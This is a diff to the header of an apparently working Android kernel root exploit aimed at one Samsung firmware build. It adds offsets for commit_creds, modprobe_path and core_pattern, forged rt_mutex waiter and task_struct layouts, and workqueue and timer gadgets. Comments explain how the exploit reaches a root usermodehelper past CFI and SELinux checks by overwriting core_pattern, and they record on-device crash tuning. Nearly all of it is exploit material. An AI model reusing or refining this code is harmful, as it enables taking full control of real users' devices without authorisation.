@@ -114,12 +114,31 @@
 #define APP_SLIDE_RECLAIM_SENDS 64
 #define PIPE_MAX_ATTEMPTS 12
 
-#define SLIDE_FAKE_WAITER_PRIO 0
+/* Forged waiter priority. The reference writes 0x82
+ * (04_fake_kernel_objects.c:125 -> TARGET_FAKE_WAITER_PRIO). We wrote 0, which is a valid
+ * value but a degenerate one: it makes the waiter look like the lowest-priority task, so
+ * rt_mutex_dequeue_pi has no reason to touch its prio chain and the forged node is never
+ * visited. 0x82 sits just under the consumer so the PI adjustment has something to do
+ * without letting the forged task outrank it. */
+#define SLIDE_FAKE_WAITER_PRIO 0x82
 #define SLIDE_WAITER_WAKE_STATE 0
-#define SLIDE_LOCK_OWNER_VALUE 0ULL
+/* Must match common.h: a non-NULL owner, or the lock reads as unlocked. */
+#define SLIDE_LOCK_OWNER_VALUE 1ULL
 #define SLIDE_WAIT_NSEC 2000000000L
 #define SLIDE_REQUEUE_ARM_USEC 20000
-#define SLIDE_USE_FAKE_TASK 1
+/* 0, not 1. With 1 the slide forge writes pi_top_task = fake_task, i.e. the fake
+ * task points at ITSELF. That is the exact failure already recorded for this route
+ * (slide_app.c: "a self-referential rb_leftmost sends rb_erase into rb_next() and
+ * then into garbage, which is why the kernel died inside rt_mutex_dequeue_pi at
+ * rtmutex.c:1249"). The futex-PI route reaches that walk via sched_setattr ->
+ * rt_mutex_adjust_pi -> rt_mutex_adjust_prio_chain, which follows pi_top_task, so a
+ * self-reference is fatal there too - measured: the device rebooted immediately
+ * after "consumer: entering sched_setattr".
+ * 0 makes util.c take the #else branch, which matches the reference's
+ * 04_fake_kernel_objects.c exactly: waiter_task = SLIDE_INIT_TASK (a real task),
+ * task_group = SLIDE_ROOT_TASK_GROUP (a real task_group), pi_top_task =
+ * SLIDE_INIT_TASK (a real task that terminates the chain). */
+#define SLIDE_USE_FAKE_TASK 0
 #define LEGACY_RT_MUTEX_WAITER 0
 #define COMPACT_RT_MUTEX_WAITER 1
 #define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
@@ -204,6 +223,22 @@
 #define PREPARE_KERNEL_CRED_OFF   0x0011e3c8ULL
 #define COMMIT_CREDS_OFF          0x00120104ULL
 #define OVERRIDE_CREDS_OFF        0x0011f1dcULL
+/* root_task_group is a REAL, separate global in this kernel: `struct task_group
+ * root_task_group;` is defined at kernel/sched/core.c:9560 as a plain uninitialised
+ * object, and it is used as a first-class pointer at core.c:1471 and core.c:1745
+ * (`task_group(p) == &root_task_group`, `struct task_group *tg = &root_task_group;`).
+ *
+ * DO NOT "fix" this offset on the grounds that it reads as zero in the Image. I made
+ * that mistake and the source disproved it: because core.c:9560 is an uninitialised
+ * definition, root_task_group lives in .bss, so its 48 bytes at 0x02cb9ac0 are ALL ZERO
+ * in the on-disk Image while being perfectly valid at runtime. Zeros here are the
+ * EXPECTED on-disk appearance of a .bss object, not evidence of a wrong offset.
+ * init_task.task_group is likewise boot-initialised (the byte at init_task+0x400 is also
+ * zero on disk), so neither offset can be validated from the Image.
+ *
+ * For contrast, INIT_TASK_OFF 0x02c05080 IS verifiable from the Image, and is:
+ *   +0x38 (usage) == 2 and +0x7c (prio) == 120 and +0x20 == 0xffffffc00a0adf68 (a slid
+ *   kernel stack pointer), all of which are init_task's signature. */
 #define ROOT_TASK_GROUP_OFF       0x02cb9ac0ULL
 #define SELINUX_ENFORCING_OFF     0x02d8e5c0ULL
 /* kmalloc_caches.
@@ -354,6 +389,20 @@
 #define TTY_OPS_FLUSH_BUFFER_OFF    0xa8U
 
 #define WORK_DATA_OFF               0x00U
+/* WORK_STRUCT_PENDING is bit 0 of work_struct::data (kernel/workqueue.h). The kernel tests
+   `!test_and_set_bit(WORK_STRUCT_PENDING_BIT, &work->data)` when queueing, and
+   process_one_work() clears it before calling work->func, so a queued work must carry it or the
+   pool would never treat the entry as pending. */
+#define WORK_STRUCT_PENDING         (1ULL << 0)
+/* workqueue.h flag bits, CONFIG_DEBUG_OBJECTS_WORK off (absent from every
+   arm64 defconfig): PENDING=bit0, INACTIVE=bit1, PWQ=bit2 ("data points to
+   pwq"), LINKED=bit3, COLOR_SHIFT=4, COLOR_BITS=4 => FLAG_BITS=8. While
+   queued, set_work_pwq() stores data = (unsigned long)pwq | PENDING | PWQ |
+   color, so the high bits hold the 256-byte-aligned pool_workqueue pointer;
+   off-queue, the PWQ bit is clear and the high bits hold a small pool id. */
+#define WORK_STRUCT_PWQ             (1ULL << 2)
+#define WORK_STRUCT_FLAG_MASK       0xffULL
+#define WORK_STRUCT_FLAG_BITS       WORK_STRUCT_PENDING
 #define WORK_ENTRY_OFF              0x08U
 #define WORK_FUNC_OFF               0x18U
 #define WORK_PENDING_BIT            0x1ULL
@@ -376,6 +425,34 @@
 #define SYSTEM_UNBOUND_WQ_OFF     0x02a90800ULL
 #define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001045d0ULL
 
+/* delayed_work_timer_fn, resolved from the Image's kallsyms. The
+ * static-work forge targets ARMED delayed_works: their timer_list
+ * sits at delayed_work+48 and timer.function (delayed_work+72) is
+ * this symbol. Measured on-device 2026-10-04 (RFCWC0G1Z1J, run18
+ * diag: tfunc=ffffffc0081123c0 at image base ffffffc008008000 ->
+ * offset 0x10a3c0) on all three known candidates, so it is a
+ * property of this kernel image, not of a run. */
+#define DELAYED_WORK_TIMER_FN_OFF 0x0010a3c0ULL
+
+/* nfc_llcp_sdreq_timer, resolved from the GZH2 factory Image's
+ * kallsyms (net/nfc/llcp_core.c) with a from-scratch offline
+ * decoder. Its body is from_timer() + schedule_work() only - no
+ * locks, no other derefs - so it is the ideal timer-to-workqueue
+ * bridge for the cascade: a genuine void (*)(struct timer_list *)
+ * (CFI-clean at the wheel's call site, unlike exec_work), and the
+ * forged work it queues runs on a real kworker (sleepable context,
+ * init_cred -> root creds, unlike the timer softirq). Verified
+ * 2026-10-10: the same decoder reproduces 5 independently-known
+ * offsets exactly (delayed_work_timer_fn 0x10a3c0, exec_work
+ * 0x1045d0, system_unbound_wq 0x2a90800, init_task 0x2c05080,
+ * selinux_enforcing 0x2d8e5c0), and IDA disassembly of the image
+ * at this offset shows the expected shape (ADD X2,X0,#0x38 for
+ * &sdreq_timeout_work = timer+56, then inlined queue_work onto
+ * system_wq ending in BL __queue_work). Sibling
+ * idletimer_tg_expired resolved the same way at 0x13d2868
+ * (kept as fallback; it writes container bools past the stub). */
+#define NFC_LLCP_SDREQ_TIMER_FN_OFF 0x0016c5758ULL
+
 /* tty SAK trigger, resolved from the Image's kallsyms (not guessed).
  *
  * do_SAK(tty) is drivers/tty/tty_io.c:3098, EXPORT_SYMBOL'd at L3104. It is what the root
@@ -393,8 +470,71 @@
 #define DO_SAK_OFF                 0x000bb8728ULL
 #define DO_SAK_WORK_OFF            0x000bb5f14ULL
 
-#define ASHMEM_FOPS_OFF           0x0200d538ULL
+/* ashmem_fops. CORRECTED on 2026-09-30 from the raw F946BXXS7GZH2 arm64 Image:
+ * the inherited 0x0200d538 reads back as ASCII, not a table. Reading the Image's
+ * own ashmem_misc.fops pointer (file 0x02bfcf28) yields 0x0200d478, and that
+ * table matches target.h EXACTLY on five independent entries - mmap 0x0114cd90,
+ * release 0x0114d108, ioctl 0x0114c6dc, show_fdinfo 0x0114d224, open 0x0114d070.
+ * The same 0xC0 skew is independently measured for ANON_PIPE_BUF_OPS_OFF and is
+ * documented under KMALLOC_CACHES_OFF: inherited data-symbol offsets are +0xC0
+ * on this firmware, while code-symbol offsets are exact. */
+#define ASHMEM_FOPS_OFF           0x0200d478ULL
 #define ASHMEM_MISC_FOPS_OFF      0x02bfcf28ULL
+
+/* modprobe_path - kernel .data char[KMOD_PATH_LEN] initialised to "/sbin/modprobe".
+ *
+ * Derived from the raw F946BXXS7GZH2 arm64 Image (C:\Users\admin\AppData\Local\
+ * Temp\opencode\gzh2\Image.gz_gh2, magic 'ARM\x64' at 0x38) where file offset ==
+ * KIMAGE_TEXT_BASE-relative offset. "/sbin/modprobe" occurs EXACTLY ONCE, at file
+ * 0x02ab2bf8 (the sibling extracted\kernel copies it to 0x2ab3bf8 purely because
+ * that container carries a 0x1000 boot header).
+ *
+ * Method cross-validated in the same file against the ASHMEM_MISC_FOPS pointer
+ * chain above, so this is a measurement, not a guess.
+ *
+ * Why this symbol: it needs only image-window ARW - the exact primitive that
+ * already carries the CFI ladder to cfi_step=0 - whereas the legacy workqueue
+ * path must dereference heap pointers, and target.h records that a READ of a
+ * direct-map address panics this firmware. */
+#define MODPROBE_PATH_OFF         0x02ab2bf8ULL
+#define MODPROBE_PATH (KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF)
+
+/* core_pattern - kernel .data char[COREP_NAME_SIZE] initialised to "core".
+ *
+ * LOCATED BY SEARCH, NOT ASSUMED. Method validated on this exact image: searching the
+ * GZH2 Image (C:\Users\admin\AppData\Local\Temp\opencode\gzh2\Image.gz_gh2.i64) for the byte
+ * pattern of "/sbin/modprobe\0" returns exactly ONE hit at 0x2ab2bf8, which equals
+ * MODPROBE_PATH_OFF above - so a unique byte-pattern hit for a known .data string is a
+ * reliable offset derivation on this build. Applying the same method to core_pattern's
+ * initial value "core\0\0\0\0\0" returns exactly ONE hit at 0x2b5b6d0. No "/data/core"
+ * variant exists on this build.
+ *
+ * WHY THIS SYMBOL, and why it is the most promising remaining target:
+ * modprobe_path is unusable on this device because call_modprobe() runs
+ * security_kernel_module_request() BEFORE queueing the usermodehelper, and that AVC denies
+ * u:r:shell:s0 - measured, and modprobe_path has exactly one caller in the tree.
+ * core_pattern's pipe mode reaches a usermodehelper by a DIFFERENT path:
+ *     get_signal() -> sig_kernel_coredump() -> do_coredump() -> __crash_kexec()
+ *                  -> call_usermodehelper_setup() -> queue_work(system_unbound_wq, ...)
+ * There is NO security_kernel_module_request() anywhere on that path. The work is executed by
+ * a kworker, and kworkers run with init_cred - which is precisely the privilege source the
+ * upstream UMH route relies on ("workqueues provide the privilege level that caller might not
+ * have to perform the usermodehelper request", kernel/umh.c).
+ * format_corename() does "++pat_ptr", which SKIPS the leading '|', so cn.corename starts with
+ * '/' and the pipe branch is taken - an earlier claim that the pipe branch is rejected was
+ * WRONG.
+ * It lives in .data: 0x2b5b6d0 is inside the measured writable window
+ * [kaslr+0x2a30000, kaslr+0x2f50000), at window offset 0x12b6d0, with ~4 MB of room after it.
+ * So this is a .data-ONLY write that reaches a root-privileged UMH - the first such target,
+ * because every queue/cred target needs a heap write that this firmware cannot perform.
+ * RISK, to be checked on device rather than assumed: kernel/umh.c's
+ * call_usermodehelper_exec() honours CONFIG_STATIC_USERMODEHELPER_PATH, which on this build is
+ * measured to be the empty string. The empty-path gate lives INSIDE that function, and unlike
+ * the workqueue route the core_pattern path DOES traverse it - so if the path we plant is
+ * treated as empty the helper will not run. A non-empty planted path avoids that.
+ */
+#define CORE_PATTERN_OFF          0x02b5b6d0ULL
+#define CORE_PATTERN (KIMAGE_TEXT_BASE + CORE_PATTERN_OFF)
 #define ASHMEM_IOCTL_OFF          0x0114c6dcULL
 #define ASHMEM_COMPAT_IOCTL_OFF   0x0114cd38ULL
 #define ASHMEM_MMAP_OFF           0x0114cd90ULL
@@ -425,6 +565,8 @@
 #define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
 #define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
 #define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
+#define DELAYED_WORK_TIMER_FN (KIMAGE_TEXT_BASE + DELAYED_WORK_TIMER_FN_OFF)
+#define NFC_LLCP_SDREQ_TIMER_FN (KIMAGE_TEXT_BASE + NFC_LLCP_SDREQ_TIMER_FN_OFF)
 
 /* tty SAK trigger, used by the PTY root stage: installed into tty->ops->flush_buffer so
  * tty_driver_flush_buffer() -> do_SAK() -> schedule_work(&tty->SAK_work) hands our borrowed
@@ -457,6 +599,50 @@
   (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
 
 #define LOCK_OFF 0x2210
+/* rt_mutex_base field offsets, relative to LOCK_OFF.
+ * Measured against our own kernel source: struct rt_mutex_base is wait_lock (0), waiters
+ * (struct rb_root_cached at 8), woken (0x18), owner (0x20). The reference forge writes exactly
+ * these three, and the BUG_ON at rtmutex_common.h:118 checks wait_lock == 0, so leaving wait_lock
+ * at zero from the memset is load-bearing, not an oversight. */
+#define RTMUTEX_WAIT_LOCK_OFF 0x00ULL
+#define RTMUTEX_WAITERS_ROOT_OFF 0x08ULL
+#define RTMUTEX_WAITERS_LEFTMOST_OFF 0x10ULL
+#define RTMUTEX_OWNER_OFF 0x18ULL
+
+/* Self-reference offsets. The forged objects all live in ONE page, so every intra-forge pointer is
+ * written as (aligned_base | its own offset). That keeps the graph internally consistent without
+ * needing to know where the page will actually land, which is the whole trick: the page address is
+ * only known after the slide, but the content is written before it. */
+#define LOCK_WAITERS_SELF_LIVE_OFF 0x14d0ULL
+#define PI_WAITERS_SELF_LIVE_OFF 0x14e8ULL
+
+/* struct task_struct field offsets used by the rt_mutex PI traversal, relative to the task.
+ * From our own kernel source include/linux/sched.h, cross-checked against the reference forge
+ * which drives the identical kernel path: usage, prio, normal_prio, task_group, pi_lock,
+ * pi_waiters, pi_waiters (leftmost), pi_top_task and pi_blocked_on are exactly the fields
+ * rt_mutex_adjust_pi / rt_mutex_dequeue_pi walk. */
+#define TASK_USAGE_OFF 0x38ULL
+#define TASK_PRIO_OFF 0x7cULL
+#define TASK_NORMAL_PRIO_OFF 0x84ULL
+#define TASK_TASK_GROUP_OFF 0x400ULL
+#define TASK_PI_LOCK_OFF 0x884ULL
+#define TASK_PI_WAITERS_OFF 0x898ULL
+#define TASK_PI_WAITERS_LEFTMOST_OFF 0x8a0ULL
+#define TASK_PI_TOP_TASK_OFF 0x8a8ULL
+#define TASK_PI_BLOCKED_ON_OFF 0x8b0ULL
+
+/* Values, not offsets. REFCOUNT_HI 0x100 is what makes the task look "in use" to anything that
+ * refcounts it; MAX_RT_PRIO-2 gives it a plausible priority without letting it outrank the
+ * consumer, which is what keeps rt_mutex_adjust_pi taking the fast, non-boost path. */
+#define FAKE_TASK_USAGE_VALUE 0x100U
+#define FAKE_TASK_PRIO_VALUE 0x78U
+#define FAKE_WAITER_PRIO_VALUE 0x82U
+
+/* struct rb_node field offsets: __rb_parent_color, rb_right, rb_left. */
+#define RB_PARENT_OFF 0x00ULL
+#define RB_RIGHT_OFF 0x08ULL
+#define RB_LEFT_OFF 0x10ULL
+
 #define W0_OFF 0x2350
 #define FOPS_OFF 0x2000
 #define SCRATCH_OFF 0x3000
@@ -464,7 +650,33 @@
 #define LEFT_OFF 0x5550
 #define FAKE_TASK_OFF 0x3200
 
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
+/* struct rt_mutex_waiter field offsets. AUTHORITATIVE SOURCE for this tree:
+ * kernel/locking/rtmutex_common.h:33 (Samsung's own copy - struct rt_mutex_waiter is only
+ * forward-declared in include/linux/rtmutex.h:64, so rtmutex.h is NOT the definition here):
+ *
+ *   struct rt_mutex_waiter {
+ *       struct rb_node        tree_entry;     0x00  (parent 0x00, right 0x08, left 0x10)
+ *       struct rb_node        pi_tree_entry;  0x18  (parent 0x18, right 0x20, left 0x28)
+ *       struct task_struct   *task;           0x30
+ *       struct rt_mutex_base *lock;           0x38
+ *       unsigned int          wake_state;     0x40
+ *       int                   prio;           0x44
+ *       u64                   deadline;       0x48
+ *       struct ww_acquire_ctx *ww_ctx;        0x50
+ *   };                                            sizeof 0x58
+ *
+ * This is byte-for-byte the reference's LAYOUTS table (tools/derive_zzhl_target.py).
+ *
+ * RETRACTION: a previous revision of this comment claimed these offsets were "WRONG BY ONE
+ * rb_node (0x18)" and shifted task/lock/prio/wait_state/deadline all DOWN by 0x18 to
+ * 0x18/0x20/0x28/0x2c/0x30, on the assumption that rt_mutex_waiter begins with a single rb_node.
+ * That assumption was wrong: this kernel has TWO rb_node members. The shift has been reverted.
+ * tree_entry (the mutex's own waiters node) sits at 0x00; pi_tree_entry - the node enqueued
+ * into the OWNER's pi_waiters tree - sits at 0x18, and the PI traversal needs that one. */
+#define FAKE_WAITER_TREE_PARENT_OFF 0x00ULL
+#define FAKE_WAITER_TREE_RIGHT_OFF 0x08ULL
+#define FAKE_WAITER_TREE_LEFT_OFF 0x10ULL
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18ULL
 #define FAKE_WAITER_TASK_OFF 0x30
 #define FAKE_WAITER_LOCK_OFF 0x38
 #define FAKE_WAITER_WAKE_STATE_OFF 0x40
@@ -472,6 +684,12 @@
 #define FAKE_WAITER_DEADLINE_OFF 0x48
 #define FAKE_WAITER_WW_CTX_OFF 0x50
 #define FAKE_WAITER_LAYOUT_SIZE 0x58
+
+/* pi_tree_entry's own rb_node sub-fields, i.e. the node that gets linked into the owner's
+ * pi_waiters tree. rt_mutex_top_waiter() reads rb_leftmost then rb_entry(..., pi_tree_entry). */
+#define FAKE_WAITER_PI_TREE_PARENT_OFF (FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00ULL)
+#define FAKE_WAITER_PI_TREE_RIGHT_OFF (FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08ULL)
+#define FAKE_WAITER_PI_TREE_LEFT_OFF (FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10ULL)
 
 #define FAKE_TASK_USAGE_OFF 0x38
 #define FAKE_TASK_PRIO_OFF 0x7c
@@ -495,6 +713,19 @@
 #define CFG_CB_MAX_SIZE_OFF 100
 
 #define WQ_DFL_PWQ_OFF 0xb0
+/* MEASURED (see MEMORY section 16), not assumed. wq->pools is the list of boot-allocated
+   worker_pool objects for an unbound workqueue. wq->dfl_pwq (+0xb0) is the PERCPU
+   pool_workqueue and is unreadable on this firmware by construction - every fatal
+   "RD target=ffffff805f7f3xxx" in this session is that one field. The +0x10 pair reads back as an
+   asymmetric slab pointer pair (next=ffffff80011d8c10, prev=ffffff80011daa10), which is what a
+   live pools chain looks like. */
+#define WQ_POOLS_OFF 0x10
+/* Offset of worker_pool->list, used only by the ROOT_POOL_DUMP diagnostic to convert a list-node
+   pointer back to its containing pool. MEASURED as 0x0 on this firmware: pool->list.next
+   (ffffff80011d9e10) and pool->list.prev (ffffff80011db410) are the first two words of the pool. */
+#define POOL_LIST_OFF 0x0
+/* pwq->pool, still used by the per-cpu pwq bookkeeping path (colour/refcnt/inflight). That path
+   is NOT taken for the unbound wq because dfl_pwq is percpu - kept for reference only. */
 #define PWQ_POOL_OFF 0x00
 #define PWQ_WQ_OFF 0x08
 #define PWQ_WORK_COLOR_OFF 0x10
@@ -739,6 +970,11 @@
  * policy CHANGE is what forces the scheduler to take the rt_mutex_adjust_pi()
  * path; setting only a nice value does not. */
 #define FUTEX_PI_V14_SETAUNCH_POLICY 3
-#define FUTEX_PI_V14_SETAUNCH_NICE 1
+/* 19, not 1. The reference's final trigger (07_futex_pi_trigger.c, v6) issues
+ * sched_setattr with policy=SCHED_BATCH and nice=19 - the maximum nice, i.e. the
+ * largest possible priority drop. sched_setattr -> __setscheduler_params ->
+ * rt_mutex_adjust_pi only walks the pi chain when the effective priority actually
+ * changes, and a 19-level drop is what guarantees that path is taken. */
+#define FUTEX_PI_V14_SETAUNCH_NICE 19
 
 #endif
